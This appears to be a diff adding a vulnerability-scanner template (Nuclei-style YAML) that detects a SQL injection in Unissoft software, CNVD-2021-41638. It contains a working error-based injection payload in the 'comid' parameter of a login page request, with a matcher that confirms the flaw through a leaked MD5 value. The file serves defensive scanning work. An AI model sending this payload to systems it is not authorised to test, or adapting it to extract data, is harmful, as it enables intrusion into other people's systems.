@@ -1,0 +1,22 @@
+id: unissoft-sql-injection-cnvd-2021-41638
+info:
+  name: Unissoft SQL Injection CNVD-2021-41638
+  author: ProjectDiscoveryAI
+  severity: high
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-41638
+  description: |
+    This template identifies a SQL injection vulnerability in Unissoft via the `comid` parameter.
+variables:
+  a1: "{{rand_int(20000000, 90000000)}}"
+http:
+  - raw:
+      - |
+        GET /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5({{a1}}))) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{substr(md5(a1), 0, 16)}}"
+        part: body
